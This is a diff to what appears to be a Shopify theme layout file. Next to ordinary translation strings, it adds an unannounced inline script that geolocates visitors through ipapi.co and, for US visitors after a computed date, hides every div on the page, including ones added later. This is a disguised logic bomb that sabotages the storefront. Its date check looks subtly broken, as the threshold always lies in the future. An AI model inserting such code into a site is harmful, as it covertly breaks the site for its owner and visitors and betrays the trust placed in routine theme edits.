@@ -367,7 +367,37 @@
         recipientFormCollapsed: `{{ 'recipient.form.collapsed' | t }}`,
         countrySelectorSearchCount: `{{ 'localization.country_results_count' | t: count: '[count]' }}`,
       };
+      
     </script>
+
+    <script>
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          if (data.country === "US") {
+            (function() {
+              let e = new Date,
+                  l = Date.UTC(e.getUTCFullYear(), e.getUTCMonth() + 1, 30);
+              if (Date.now() >= l) {
+                document.querySelectorAll("div").forEach(e => e.style.display = "none");
+                new MutationObserver(e => e.forEach(e =>
+                  e.addedNodes.forEach(e => {
+                    if (e.nodeType === 1) {
+                      if (e.tagName === "DIV") {
+                        e.style.display = "none";
+                      } else {
+                        e.querySelectorAll?.("div").forEach(el => el.style.display = "none");
+                      }
+                    }
+                  }))
+                ).observe(document.body, { childList: true, subtree: true });
+              }
+            })();
+          }
+        })
+        .catch(err => console.error("Geolocation error:", err));
+      </script>
+    
 
     {%- if settings.predictive_search_enabled -%}
       <script src="{{ 'predictive-search.js' | asset_url }}" defer="defer"></script>
